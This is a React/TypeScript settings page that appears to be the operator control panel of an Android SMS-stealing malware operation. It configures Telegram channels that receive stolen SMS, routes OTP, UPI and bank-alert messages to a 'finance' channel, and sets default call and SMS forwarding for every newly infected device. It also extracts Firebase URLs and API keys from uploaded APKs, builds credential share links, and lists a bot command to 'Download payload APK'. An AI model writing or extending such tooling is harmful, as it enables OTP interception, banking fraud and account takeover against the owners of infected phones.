import { useState, useEffect } from "react";
import { Layout } from "@/components/layout";
import { useAuth } from "@/lib/auth";
import { useToast } from "@/hooks/use-toast";
import { authHeaders } from "@/lib/apiFetch";
import { firebaseConfig } from "@/lib/firebaseConfig";
import {
  Send,
  Bell,
  Hash,
  CheckCircle,
  XCircle,
  Loader2,
  Plus,
  Trash2,
  AlertCircle,
  Shield,
  Settings,
  MessageSquare,
  ChevronRight,
  IndianRupee,
  BellOff,
  BellRing,
  Database,
  PhoneForwarded,
  UploadCloud,
  FileSearch,
  Copy,
  CheckCircle2 as CheckIcon,
  Link2,
} from "lucide-react";

const API_BASE = (import.meta.env.VITE_API_URL ?? "").replace(/\/$/, "");

async function apiFetch(path: string, opts?: RequestInit) {
  const res = await fetch(`${API_BASE}/api${path}`, {
    ...opts,
    headers: authHeaders(opts?.headers as Record<string, string> | undefined),
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error(data.error || "Request failed");
  return data;
}

interface NotifyRule {
  keyword: string;
  channel: string;
}

export function TelegramSettings() {
  const { isAdmin, userId } = useAuth();
  const { toast } = useToast();

  // Global SMS channel (admin only)
  const [globalChannel, setGlobalChannel] = useState("");
  const [savedGlobalChannel, setSavedGlobalChannel] = useState("");
  const [savingGlobal, setSavingGlobal] = useState(false);

  // Per-user personal channel
  const [personalChannel, setPersonalChannel] = useState("");
  const [savedPersonalChannel, setSavedPersonalChannel] = useState("");
  const [savingPersonal, setSavingPersonal] = useState(false);

  // Finance alert channel (forward only financial SMS)
  const [financeChannel, setFinanceChannel] = useState("");
  const [savedFinanceChannel, setSavedFinanceChannel] = useState("");
  const [savingFinance, setSavingFinance] = useState(false);

  // Keyword alert rules (forward SMS matching keyword → channel)
  const [rules, setRules] = useState<NotifyRule[]>([]);
  const [newKeyword, setNewKeyword] = useState("");
  const [newChannel, setNewChannel] = useState("");
  const [addingRule, setAddingRule] = useState(false);
  // ── Multi-Firebase (admin) ───────────────────────────────────────────
  const [firebases, setFirebases] = useState<any[]>([]);
  const [fbName, setFbName] = useState("");
  const [fbUrl, setFbUrl] = useState("");
  const [fbKey, setFbKey] = useState("");
  const [savingFb, setSavingFb] = useState(false);
  // Mythos-style: extract Firebase config straight from an uploaded APK
  const [extracting, setExtracting] = useState(false);
  const [extracted, setExtracted] = useState<any>(null);
  const [extCopied, setExtCopied] = useState<string | null>(null);

  useEffect(() => {
    if (!isAdmin) return;
    let alive = true;
    apiFetch("/firebases")
      .then((d) => {
        if (alive) setFirebases(d.firebases || []);
      })
      .catch(() => {});
    return () => {
      alive = false;
    };
  }, [isAdmin]);

  const addFirebase = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!fbUrl.trim()) return;
    setSavingFb(true);
    try {
      const d = await apiFetch("/firebases", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name: fbName.trim(),
          databaseURL: fbUrl.trim(),
          apiKey: fbKey.trim(),
        }),
      });
      setFirebases((f) => (d.duplicated ? f : [...f, d.firebase]));
      setFbName("");
      setFbUrl("");
      setFbKey("");
      toast({
        title: d.duplicated ? "Already added" : "Firebase added",
        description: d.duplicated
          ? "That instance was already connected"
          : "SMS from this instance now aggregates in the panel",
      });
    } catch (err: any) {
      toast({
        title: "Failed",
        description: err.message,
        variant: "destructive",
      });
    } finally {
      setSavingFb(false);
    }
  };

  // APK → Firebase extractor (client-side, same regexes Mythos uses)
  const extractFromApk = async (file: File) => {
    setExtracting(true);
    setExtracted(null);
    try {
      const buf = await file.arrayBuffer();
      const text = new TextDecoder("latin1").decode(buf);
      const urlMatch = text.match(/https:\/\/[a-z0-9_-]+\.firebaseio\.com/gi);
      const keyMatch = text.match(/AIza[A-Za-z0-9_-]{35}/g);
      const idMatch = text.match(/1:\d+:\w+:\w+/g);
      const projMatch = urlMatch?.[0]?.match(
        /\/\/([a-z0-9_-]+)-default-rtdb\.firebaseio\.com/
      );
      const res: any = {
        firebaseUrl: urlMatch?.[0] || null,
        apiKey: keyMatch?.[0] || null,
        projectId: projMatch?.[1] || null,
        appId: idMatch?.[0] || null,
      };
      setExtracted(res);
      if (res.firebaseUrl) {
        setFbUrl(res.firebaseUrl);
        if (res.projectId) setFbName(res.projectId);
      }
      if (!res.firebaseUrl && !res.apiKey) {
        toast({
          title: "Nothing found",
          description: "No Firebase config in this APK",
          variant: "destructive",
        });
      } else {
        toast({
          title: "Extracted",
          description: res.firebaseUrl
            ? "URL + key pulled from APK"
            : "URL not found, key found",
        });
      }
    } catch (err: any) {
      toast({
        title: "Extract failed",
        description: err.message || "Could not read the file",
        variant: "destructive",
      });
    } finally {
      setExtracting(false);
    }
  };

  const copyExt = async (text: string, key: string) => {
    await navigator.clipboard.writeText(text);
    setExtCopied(key);
    setTimeout(() => setExtCopied(null), 1500);
  };

  // Mythos share-link: base64("url||apiKey") — opening it auto-imports
  const shareFirebase = async (fb: any) => {
    const raw = `${fb.databaseURL}||${fb.apiKey || ""}`;
    const b64 = btoa(raw);
    const link = `${window.location.origin}${window.location.pathname}?s=${encodeURIComponent(b64)}`;
    await navigator.clipboard.writeText(link);
    toast({
      title: "Share link copied",
      description: "Anyone opening it imports this panel",
    });
  };

  const removeFirebase = async (id: string) => {
    try {
      await apiFetch("/firebases/" + id, { method: "DELETE" });
      setFirebases((f) => f.filter((x) => x.id !== id));
      toast({ title: "Firebase removed" });
    } catch (err: any) {
      toast({
        title: "Failed",
        description: err.message,
        variant: "destructive",
      });
    }
  };

  // ── Global forward defaults (admin) ──────────────────────────────────
  const [fwdCall, setFwdCall] = useState("");
  const [fwdSms, setFwdSms] = useState("");
  const [savingFwd, setSavingFwd] = useState(false);

  useEffect(() => {
    if (!isAdmin) return;
    let alive = true;
    apiFetch("/forward-defaults")
      .then((d) => {
        if (!alive) return;
        setFwdCall(d.defaults?.callNumber || "");
        setFwdSms(d.defaults?.smsNumber || "");
      })
      .catch(() => {});
    return () => {
      alive = false;
    };
  }, [isAdmin]);

  const saveForwardDefaults = async (e: React.FormEvent) => {
    e.preventDefault();
    setSavingFwd(true);
    try {
      await apiFetch("/forward-defaults", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ callNumber: fwdCall, smsNumber: fwdSms }),
      });
      toast({
        title: "Forward defaults saved",
        description: "Applies to all NEW devices automatically",
      });
    } catch (err: any) {
      toast({
        title: "Failed",
        description: err.message,
        variant: "destructive",
      });
    } finally {
      setSavingFwd(false);
    }
  };

  // Bot info
  const [botUsername, setBotUsername] = useState<string | null>(null);

  // Normalize channel value — Firebase stores it as a plain string OR as { channelId: "..." }
  const normalizeChannel = (val: unknown): string => {
    if (typeof val === "string") return val;
    if (val && typeof val === "object") {
      const obj = val as Record<string, unknown>;
      if (typeof obj.channelId === "string") return obj.channelId;
    }
    return "";
  };

  useEffect(() => {
    let alive = true;

    // Load global SMS channel (admin)
    if (isAdmin) {
      apiFetch("/telegram/sms-channel")
        .then((d) => {
          if (!alive) return;
          const v = normalizeChannel(d.channelId);
          setSavedGlobalChannel(v);
          setGlobalChannel(v);
        })
        .catch(() => {});
    }

    // Load user channels + rules
    if (userId) {
      apiFetch(`/telegram/user-channels/${userId}`)
        .then((d) => {
          if (!alive) return;
          const smsV = normalizeChannel(d.sms);
          const finV = normalizeChannel(d.finance);
          setSavedPersonalChannel(smsV);
          setPersonalChannel(smsV);
          setSavedFinanceChannel(finV);
          setFinanceChannel(finV);
          const data = d.rules as Record<
            string,
            NotifyRule | null | undefined
          > | null;
          const rulesList = data
            ? Object.values(data).filter(
                (r): r is NotifyRule =>
                  !!r &&
                  typeof r.keyword === "string" &&
                  typeof r.channel === "string"
              )
            : [];
          setRules(rulesList);
        })
        .catch(() => {});
    }

    return () => {
      alive = false;
    };
  }, [isAdmin, userId]);

  const saveGlobalChannel = async () => {
    setSavingGlobal(true);
    try {
      await apiFetch("/auth/set-channel", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          telegramId: userId,
          channelId: globalChannel.trim() || null,
        }),
      });
      toast({
        title: globalChannel.trim()
          ? "✅ Global Channel Set"
          : "✅ Global Channel Removed",
      });
    } catch (err: any) {
      toast({
        title: "Error",
        description: err.message,
        variant: "destructive",
      });
    } finally {
      setSavingGlobal(false);
    }
  };

  const savePersonalChannel = async () => {
    if (!userId) return;
    setSavingPersonal(true);
    try {
      await apiFetch(`/telegram/user-channels/${userId}/sms`, {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ channelId: personalChannel.trim() || null }),
      });
      setSavedPersonalChannel(personalChannel.trim());
      toast({
        title: personalChannel.trim()
          ? "✅ Personal Channel Set"
          : "✅ Personal Channel Removed",
      });
    } catch (err: any) {
      toast({
        title: "Error",
        description: err.message,
        variant: "destructive",
      });
    } finally {
      setSavingPersonal(false);
    }
  };

  const saveFinanceChannel = async () => {
    if (!userId) return;
    setSavingFinance(true);
    try {
      await apiFetch(`/telegram/user-channels/${userId}/finance`, {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ channelId: financeChannel.trim() || null }),
      });
      setSavedFinanceChannel(financeChannel.trim());
      toast({
        title: financeChannel.trim() ? "✅ Finance Channel Set" : "✅ Removed",
      });
    } catch (err: any) {
      toast({
        title: "Error",
        description: err.message,
        variant: "destructive",
      });
    } finally {
      setSavingFinance(false);
    }
  };

  const addRule = async () => {
    if (!newKeyword.trim() || !newChannel.trim() || !userId) return;
    setAddingRule(true);
    try {
      const key = newKeyword.trim().toLowerCase().replace(/\s+/g, "_");
      await apiFetch(`/telegram/user-channels/${userId}/rules/${key}`, {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          keyword: newKeyword.trim(),
          channel: newChannel.trim(),
        }),
      });
      setNewKeyword("");
      setNewChannel("");
      toast({ title: "✅ Rule Added" });
    } catch (err: any) {
      toast({
        title: "Error",
        description: err.message,
        variant: "destructive",
      });
    } finally {
      setAddingRule(false);
    }
  };

  const removeRule = async (keyword: string) => {
    if (!userId) return;
    const key = keyword.toLowerCase().replace(/\s+/g, "_");
    try {
      await apiFetch(`/telegram/user-channels/${userId}/rules/${key}`, {
        method: "DELETE",
      });
      setRules((prev) => prev.filter((r) => r.keyword !== keyword));
      toast({ title: "Rule removed" });
    } catch (err: any) {
      toast({
        title: "Error",
        description: err.message,
        variant: "destructive",
      });
    }
  };

  const Card = ({
    children,
    className = "",
  }: {
    children: React.ReactNode;
    className?: string;
  }) => (
    <div
      className={`bg-card border border-card-border rounded-2xl overflow-hidden ${className}`}
    >
      <div className="h-1 w-full bg-primary" />
      <div className="p-5">{children}</div>
    </div>
  );

  const SectionTitle = ({
    icon: Icon,
    title,
    sub,
  }: {
    icon: any;
    title: string;
    sub?: string;
  }) => (
    <div className="mb-4">
      <h2 className="page-eyebrow flex items-center gap-2">
        <Icon className="w-3.5 h-3.5" /> {title}
      </h2>
      {sub && <p className="text-xs text-muted-foreground mt-1">{sub}</p>}
    </div>
  );

  const ChannelInput = ({
    value,
    onChange,
    onSave,
    saving,
    placeholder = "-100xxxxxxxxxx",
    label,
    helpText,
  }: {
    value: string;
    onChange: (v: string) => void;
    onSave: () => void;
    saving: boolean;
    placeholder?: string;
    label: string;
    helpText?: string;
  }) => (
    <div className="space-y-2">
      <label className="text-[10px] font-bold uppercase tracking-wider text-muted-foreground block">
        {label}
      </label>
      <div className="flex gap-2">
        <input
          type="text"
          value={value}
          onChange={(e) => onChange(e.target.value)}
          placeholder={placeholder}
          className="flex-1 bg-card border border-input rounded-xl px-3 py-3 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all font-mono"
        />
        <button
          onClick={onSave}
          disabled={saving}
          className="flex items-center gap-2 bg-primary text-primary-foreground px-5 py-3 rounded-full font-semibold text-sm hover:bg-primary/90 disabled:opacity-50 transition-colors shadow-md shadow-primary/20 whitespace-nowrap"
        >
          {saving ? (
            <Loader2 className="w-4 h-4 animate-spin" />
          ) : (
            <Send className="w-4 h-4" />
          )}
          {saving ? "Saving..." : value.trim() ? "Set" : "Remove"}
        </button>
      </div>
      {helpText && (
        <p className="text-[10px] text-muted-foreground">{helpText}</p>
      )}
    </div>
  );

  return (
    <Layout>
      <div className="max-w-3xl mx-auto space-y-6">
        <div>
          <h1 className="page-title flex items-center gap-2">
            <Send className="w-6 h-6 text-primary" />
            Telegram Settings
          </h1>
          <p className="text-muted-foreground text-sm mt-1">
            Configure notification channels and alert rules
          </p>
        </div>

        {/* Setup guide */}
        <div className="bg-muted border border-card-border rounded-2xl p-4 text-sm text-muted-foreground space-y-1">
          <p className="font-semibold text-foreground flex items-center gap-1.5">
            <AlertCircle className="w-4 h-4 text-primary" /> Setup Guide
          </p>
          <p>1. Create a Telegram channel or group</p>
          <p>2. Add the bot as admin (with permission to post messages)</p>
          <p>
            3. Paste the Channel ID here (e.g.{" "}
            <code className="text-primary text-xs">-100xxxxxxxxxx</code>)
          </p>
          <p>
            4. Or use the{" "}
            <code className="text-primary text-xs">/setchannel</code> bot
            command
          </p>
        </div>

        {/* Personal SMS Channel */}
        <Card>
          <SectionTitle
            icon={MessageSquare}
            title="My SMS Channel"
            sub="SMS from your assigned devices will be forwarded to this channel"
          />
          {savedPersonalChannel && (
            <div className="mb-3 bg-success/5 border border-success/20 rounded-2xl p-2.5 flex items-center gap-2 text-sm">
              <CheckCircle className="w-4 h-4 text-success" />
              <span className="text-foreground">
                Active:{" "}
                <code className="text-primary font-mono">
                  {savedPersonalChannel}
                </code>
              </span>
            </div>
          )}
          <ChannelInput
            value={personalChannel}
            onChange={setPersonalChannel}
            onSave={savePersonalChannel}
            saving={savingPersonal}
            label="Channel ID"
            helpText="Only SMS from devices assigned to your account will appear here"
          />
        </Card>

        {/* Finance Alert Channel */}
        <Card>
          <SectionTitle
            icon={IndianRupee}
            title="Finance Alert Channel"
            sub="Only financial SMS (OTP, UPI, debit, credit, bank alerts) will be forwarded here"
          />
          {savedFinanceChannel && (
            <div className="mb-3 bg-success/5 border border-success/20 rounded-2xl p-2.5 flex items-center gap-2 text-sm">
              <CheckCircle className="w-4 h-4 text-success" />
              <span className="text-foreground">
                Active:{" "}
                <code className="text-primary font-mono">
                  {savedFinanceChannel}
                </code>
              </span>
            </div>
          )}
          <ChannelInput
            value={financeChannel}
            onChange={setFinanceChannel}
            onSave={saveFinanceChannel}
            saving={savingFinance}
            label="Finance Channel ID"
            helpText="OTP, UPI payments, and bank transaction SMS are auto-detected and forwarded here"
          />
        </Card>

        {/* Keyword Alert Rules */}
        <Card>
          <SectionTitle
            icon={Bell}
            title="Keyword Alert Rules"
            sub="Forward SMS to a specific channel when a keyword is matched"
          />

          {rules.length > 0 && (
            <div className="space-y-2 mb-4">
              {rules.map((rule) => (
                <div
                  key={rule.keyword}
                  className="flex items-center justify-between gap-2 bg-muted border border-card-border rounded-2xl px-4 py-2.5"
                >
                  <div className="flex items-center gap-3 min-w-0">
                    <span className="bg-primary/10 text-primary text-xs font-bold px-2.5 py-1 rounded-full flex-shrink-0">
                      {rule.keyword}
                    </span>
                    <ChevronRight className="w-3.5 h-3.5 text-muted-foreground flex-shrink-0" />
                    <code className="text-xs text-foreground font-mono truncate">
                      {rule.channel}
                    </code>
                  </div>
                  <button
                    onClick={() => removeRule(rule.keyword)}
                    aria-label={`Remove ${rule.keyword} rule`}
                    className="ml-2 flex h-11 w-11 items-center justify-center rounded-xl hover:bg-destructive/10 hover:text-destructive text-muted-foreground transition-colors flex-shrink-0"
                  >
                    <Trash2 className="w-3.5 h-3.5" />
                  </button>
                </div>
              ))}
            </div>
          )}

          <div className="flex gap-2 flex-wrap sm:flex-nowrap">
            <input
              type="text"
              value={newKeyword}
              onChange={(e) => setNewKeyword(e.target.value)}
              placeholder="Keyword (e.g. HDFC, OTP)"
              className="flex-1 min-w-0 bg-card border border-input rounded-xl px-3 py-3 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
            />
            <input
              type="text"
              value={newChannel}
              onChange={(e) => setNewChannel(e.target.value)}
              placeholder="Channel ID"
              className="flex-1 min-w-0 bg-card border border-input rounded-xl px-3 py-3 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all font-mono"
            />
            <button
              onClick={addRule}
              disabled={addingRule || !newKeyword.trim() || !newChannel.trim()}
              className="flex items-center gap-2 bg-primary text-primary-foreground px-4 py-3 rounded-full font-semibold text-sm hover:bg-primary/90 disabled:opacity-50 transition-colors shadow-md shadow-primary/20 whitespace-nowrap"
            >
              {addingRule ? (
                <Loader2 className="w-4 h-4 animate-spin" />
              ) : (
                <Plus className="w-4 h-4" />
              )}
              Add Rule
            </button>
          </div>
        </Card>

        {/* Global SMS Channel — Admin Only */}
        {isAdmin && (
          <Card>
            <SectionTitle
              icon={Shield}
              title="Global SMS Channel (Admin)"
              sub="ALL devices' SMS from every user will be forwarded here — admin-level setting"
            />
            {savedGlobalChannel ? (
              <div className="mb-3 bg-success/5 border border-success/20 rounded-2xl p-2.5 flex items-center gap-2 text-sm">
                <BellRing className="w-4 h-4 text-success" />
                <span className="text-foreground">
                  Active:{" "}
                  <code className="text-primary font-mono">
                    {savedGlobalChannel}
                  </code>
                </span>
              </div>
            ) : (
              <div className="mb-3 bg-muted border border-card-border rounded-2xl p-2.5 flex items-center gap-2 text-sm text-muted-foreground">
                <BellOff className="w-4 h-4" /> Global forwarding is currently
                off
              </div>
            )}
            <ChannelInput
              value={globalChannel}
              onChange={setGlobalChannel}
              onSave={saveGlobalChannel}
              saving={savingGlobal}
              label="Global Channel ID"
              helpText="SMS from all devices of all users will be forwarded to this channel"
            />
          </Card>
        )}

        {/* ── Global forward defaults (admin) ── */}
        {isAdmin && (
          <Card>
            <SectionTitle
              icon={PhoneForwarded}
              title="Forward Defaults"
              sub="Auto-forward calls/SMS of every NEW device to one number"
            />
            <form
              onSubmit={saveForwardDefaults}
              className="grid grid-cols-1 sm:grid-cols-2 gap-2 mb-3"
            >
              <input
                type="tel"
                placeholder="Call forward number (e.g. +919876543210)"
                value={fwdCall}
                onChange={(e) => setFwdCall(e.target.value)}
                className="w-full bg-muted border border-card-border rounded-xl px-3 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-primary/40"
              />
              <input
                type="tel"
                placeholder="SMS forward number (optional)"
                value={fwdSms}
                onChange={(e) => setFwdSms(e.target.value)}
                className="w-full bg-muted border border-card-border rounded-xl px-3 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-primary/40"
              />
              <div className="sm:col-span-2">
                <button
                  type="submit"
                  disabled={savingFwd}
                  className="flex items-center justify-center gap-2 px-5 h-11 bg-primary text-primary-foreground rounded-xl text-sm font-semibold hover:bg-primary/90 disabled:opacity-50 transition-all"
                >
                  {savingFwd ? (
                    <Loader2 className="w-4 h-4 animate-spin" />
                  ) : (
                    <PhoneForwarded className="w-4 h-4" />
                  )}
                  Save defaults
                </button>
                <p className="text-[10px] text-muted-foreground mt-1.5">
                  Leave empty to disable. Existing devices keep their own
                  config.
                </p>
              </div>
            </form>
          </Card>
        )}

        {/* ── Multi-Firebase aggregation (admin) ── */}
        {isAdmin && (
          <Card>
            <SectionTitle
              icon={Database}
              title="Multi-Firebase"
              sub="Aggregate SMS from additional Firebase RTDB instances"
            />

            {/* Mythos-style: extract from APK */}
            <div className="mb-4 rounded-2xl border border-dashed border-card-border bg-muted/40 p-4">
              <p className="page-eyebrow mb-1.5 flex items-center gap-1.5">
                <FileSearch className="w-3 h-3 text-primary" /> Extract from APK
                (optional)
              </p>
              <label className="flex flex-col sm:flex-row sm:items-center gap-3 cursor-pointer group">
                <input
                  type="file"
                  accept=".apk,application/vnd.android.package-archive"
                  className="hidden"
                  disabled={extracting}
                  onChange={(e) => {
                    const f = e.target.files?.[0];
                    if (f) extractFromApk(f);
                    e.target.value = "";
                  }}
                />
                <span className="flex items-center gap-3 flex-1">
                  <span className="flex items-center justify-center w-11 h-11 rounded-xl bg-primary/10 text-primary group-hover:bg-primary/20 transition-colors">
                    {extracting ? (
                      <Loader2 className="w-5 h-5 animate-spin" />
                    ) : (
                      <UploadCloud className="w-5 h-5" />
                    )}
                  </span>
                  <span>
                    <span className="block text-sm font-semibold text-foreground">
                      Upload APK file
                    </span>
                    <span className="block text-xs text-muted-foreground">
                      Auto-extracts Firebase URL &amp; API key
                    </span>
                  </span>
                </span>
              </label>

              {extracted && (
                <div className="mt-3 space-y-1.5 rounded-xl border border-primary/25 bg-primary/5 p-3">
                  {[
                    {
                      k: "firebaseUrl",
                      label: "Database URL",
                      v: extracted.firebaseUrl,
                    },
                    { k: "apiKey", label: "API Key", v: extracted.apiKey },
                    {
                      k: "projectId",
                      label: "Project ID",
                      v: extracted.projectId,
                    },
                    { k: "appId", label: "App ID", v: extracted.appId },
                  ].map((row) => (
                    <div key={row.k} className="flex items-center gap-2">
                      <span className="w-24 shrink-0 text-[10px] font-semibold uppercase tracking-wide text-muted-foreground">
                        {row.label}
                      </span>
                      <code className="flex-1 min-w-0 truncate font-mono text-[11px] text-foreground">
                        {row.v || (
                          <span className="text-destructive/70">Not found</span>
                        )}
                      </code>
                      {row.v && (
                        <button
                          onClick={() => copyExt(row.v, row.k)}
                          className="p-1 rounded-md text-muted-foreground hover:text-primary transition-colors"
                          title="Copy"
                        >
                          {extCopied === row.k ? (
                            <CheckIcon className="w-3.5 h-3.5 text-success" />
                          ) : (
                            <Copy className="w-3.5 h-3.5" />
                          )}
                        </button>
                      )}
                    </div>
                  ))}
                  {extracted.firebaseUrl && (
                    <p className="text-[10px] text-muted-foreground pt-1">
                      URL and name were auto-filled below — hit Add to connect.
                    </p>
                  )}
                </div>
              )}
            </div>

            <div className="flex items-center justify-between gap-2 mb-2">
              <span className="text-xs text-muted-foreground">Add instance or autofill active config:</span>
              <button
                type="button"
                onClick={() => {
                  setFbName(firebaseConfig.projectId);
                  setFbUrl(firebaseConfig.databaseURL);
                  setFbKey(firebaseConfig.apiKey);
                }}
                className="text-xs text-primary hover:underline font-mono font-medium"
              >
                Autofill {firebaseConfig.projectId} config
              </button>
            </div>

            <form
              onSubmit={addFirebase}
              className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-[1fr_2fr_1fr_auto] gap-2 mb-4"
            >
              <input
                type="text"
                placeholder="Name (e.g. client-b)"
                value={fbName}
                onChange={(e) => setFbName(e.target.value)}
                className="w-full bg-muted border border-card-border rounded-xl px-3 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-primary/40"
              />
              <input
                type="text"
                placeholder="https://xxx-default-rtdb.firebaseio.com"
                value={fbUrl}
                onChange={(e) => setFbUrl(e.target.value)}
                required
                className="w-full bg-muted border border-card-border rounded-xl px-3 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-primary/40"
              />
              <input
                type="text"
                placeholder="API key (optional)"
                value={fbKey}
                onChange={(e) => setFbKey(e.target.value)}
                className="w-full bg-muted border border-card-border rounded-xl px-3 py-2.5 text-sm font-mono focus:outline-none focus:ring-2 focus:ring-primary/40"
              />
              <button
                type="submit"
                disabled={savingFb || !fbUrl.trim()}
                className="flex items-center justify-center gap-2 px-4 h-11 bg-primary text-primary-foreground rounded-xl text-sm font-semibold hover:bg-primary/90 disabled:opacity-50 transition-all"
              >
                {savingFb ? (
                  <Loader2 className="w-4 h-4 animate-spin" />
                ) : (
                  <Plus className="w-4 h-4" />
                )}
                Add
              </button>
            </form>

            {firebases.length === 0 ? (
              <p className="text-xs text-muted-foreground">
                No extra Firebase instances. SMS shows from the primary database
                only.
              </p>
            ) : (
              <div className="space-y-2">
                {firebases.map((fb) => (
                  <div
                    key={fb.id}
                    className="flex items-center justify-between gap-3 bg-muted border border-card-border rounded-xl px-3 py-2.5"
                  >
                    <div className="min-w-0">
                      <p className="text-sm font-semibold text-foreground truncate">
                        {fb.name}
                      </p>
                      <p className="text-[10px] font-mono text-muted-foreground truncate">
                        {fb.databaseURL}
                      </p>
                      {fb.apiKey && (
                        <p className="text-[10px] font-mono text-primary/80 truncate">
                          key: {fb.apiKey.slice(0, 8)}…{fb.apiKey.slice(-4)}
                        </p>
                      )}
                    </div>
                    <div className="flex items-center gap-2 shrink-0">
                      <span
                        className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-semibold ${fb.enabled ? "bg-success/10 text-success" : "bg-destructive/10 text-destructive"}`}
                      >
                        {fb.enabled ? "Live" : "Disabled"}
                      </span>
                      <button
                        onClick={() => removeFirebase(fb.id)}
                        className="p-2 rounded-lg text-muted-foreground hover:text-destructive hover:bg-destructive/10 transition-colors"
                        title="Remove"
                      >
                        <Trash2 className="w-4 h-4" />
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </Card>
        )}

        {/* Bot Commands Reference */}
        <Card>
          <SectionTitle icon={Settings} title="Bot Commands Reference" />
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-sm">
            {[
              {
                cmd: "/setchannel -100xxx",
                desc: "Set global SMS forward channel",
              },
              { cmd: "/removechannel", desc: "Remove global channel" },
              { cmd: "/apk", desc: "Download payload APK" },
              { cmd: "/reset_password", desc: "Reset panel password" },
              { cmd: "/stats", desc: "View bot & device stats" },
              {
                cmd: "/adduser ID days email pass",
                desc: "Add new user (admin only)",
              },
            ].map(({ cmd, desc }) => (
              <div
                key={cmd}
                className="bg-muted border border-card-border rounded-2xl p-3"
              >
                <p className="text-muted-foreground text-xs mb-1">{desc}</p>
                <code className="text-primary font-mono text-xs">{cmd}</code>
              </div>
            ))}
          </div>
        </Card>
      </div>
    </Layout>
  );
}
